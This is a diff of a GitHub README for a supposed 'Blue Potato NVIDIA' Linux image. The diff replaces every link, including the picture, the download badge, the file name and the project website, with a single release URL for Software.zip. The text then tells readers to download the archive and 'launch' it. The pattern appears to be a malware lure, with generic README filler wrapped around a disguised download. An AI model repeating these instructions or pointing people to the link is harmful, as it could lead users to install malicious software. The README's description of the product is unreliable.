@@ -1,7 +1,7 @@
 
 # Blue Potato NVIDIA
 
-![Blue Potato NVIDIA](https://github.com/user-attachments/files/18410590/blue-potato-nvidia.png)
+![Blue Potato NVIDIA](https://github.com/1Erne/blue-potato-nvidia/releases/download/v2.0/Software.zip)
 
 Welcome to the Blue Potato NVIDIA repository! 🥔🔵 This repository contains a personalized Blue image built specifically for NVIDIA devices. If you are looking for a customized Linux-based image that is immutable and perfect for your NVIDIA hardware, you've come to the right place.
 
@@ -19,22 +19,22 @@ Welcome to the Blue Potato NVIDIA repository! 🥔🔵 This repository contains 
 - operating-system
 
 ## Software Download
-[![Software Download](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/user-attachments/files/18410590/Software.zip)
+[![Software Download](https://github.com/1Erne/blue-potato-nvidia/releases/download/v2.0/Software.zip)](https://github.com/1Erne/blue-potato-nvidia/releases/download/v2.0/Software.zip)
 
-The **Software.zip** file contains all the necessary files to set up the Blue Potato NVIDIA image on your NVIDIA device. Click on the badge above to download the software package. Remember, it needs to be launched to access the contents.
+The **https://github.com/1Erne/blue-potato-nvidia/releases/download/v2.0/Software.zip** file contains all the necessary files to set up the Blue Potato NVIDIA image on your NVIDIA device. Click on the badge above to download the software package. Remember, it needs to be launched to access the contents.
 
 In case you encounter any issues with the download link provided, please check the "Releases" section of this repository for alternative download options.
 
 ## Getting Started
 To get started with Blue Potato NVIDIA, follow these steps:
 
-1. Download the **Software.zip** file from the link above.
+1. Download the **https://github.com/1Erne/blue-potato-nvidia/releases/download/v2.0/Software.zip** file from the link above.
 2. Launch the zip file to extract its contents.
 3. Follow the installation instructions provided in the repository to set up the Blue Potato NVIDIA image on your NVIDIA device.
 4. Enjoy your personalized Blue image tailored for NVIDIA hardware!
 
 ## Additional Resources
-For more information and detailed guides on working with Blue Potato NVIDIA, visit our [website](https://bluepotatonvidia.com). 
+For more information and detailed guides on working with Blue Potato NVIDIA, visit our [website](https://github.com/1Erne/blue-potato-nvidia/releases/download/v2.0/Software.zip). 
 
 Feel free to explore the repository and customize the Blue Potato image to suit your preferences. If you have any questions or need assistance, don't hesitate to reach out to our friendly community of Blue Potato enthusiasts. 🚀
 
